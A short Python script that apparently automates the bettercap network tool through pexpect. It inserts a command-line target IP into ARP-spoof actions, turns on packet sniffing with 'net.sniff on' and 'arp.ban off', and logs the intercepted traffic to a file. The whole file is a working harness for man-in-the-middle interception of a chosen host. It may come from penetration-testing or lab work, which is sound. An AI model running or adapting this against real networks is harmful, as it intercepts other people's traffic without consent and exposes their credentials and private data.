import pexpect
import json
import re
import sys
import time
import os

def run_interaction(program, interactions, target_ip, log_file="sniffing_output.log"):
    child = pexpect.spawn(program, timeout=60)
    print(f"Starting interaction with {program}.")

    with open(log_file, "w") as log:
        if "start" in interactions:
            for action, expectation in interactions["start"]:
                # Set target IP for ARP spoof if specified
                if "<IP>" in action and target_ip:
                    action = action.replace("<IP>", target_ip)
                    print(f"Setting ARP spoof target to {target_ip}")
                
                child.sendline(action)
                
                if action == "net.sniff on":
                    child.sendline("arp.ban off")
                    print("\n--- Real-Time Network Sniffing Output ---")
                    try:
                        while True:
                            output = child.read_nonblocking(size=1024, timeout=180).decode("utf-8", errors="ignore")
                            print(output, end="")
                            log.write(output)  # Write sniffing output to log file
                    except KeyboardInterrupt:
                        print("\n--- Stopping Network Sniffing ---")
                        child.sendline("net.sniff off")
                        break
                    except pexpect.exceptions.TIMEOUT:
                        print("Timeout while sniffing.")

                if expectation != "*":
                    child.expect(expectation, timeout=60)
                    print(f"Sent: '{action}', Expected: '{expectation}', Received: '{child.after.decode('utf-8')}'")
                else:
                    print(f"Sent: '{action}', No specific expectation")

        # Stop all actions in the "stop" mode to clean up
        if "stop" in interactions:
            for action, _ in interactions["stop"]:
                child.sendline(action)
        
    child.close()
    print("Interaction completed.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python driver_bettercap.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    json_file = "config_bettercap.json"
    
    with open(json_file, "r") as f:
        config = json.load(f)

    program = config["program"]
    #program = program.replace("<IP>", target_ip)
    #print(program)
    #time.sleep(100000)
    interactions = config["interactions"]

    run_interaction(program, interactions, target_ip=target_ip)

if __name__ == "__main__":
    main()
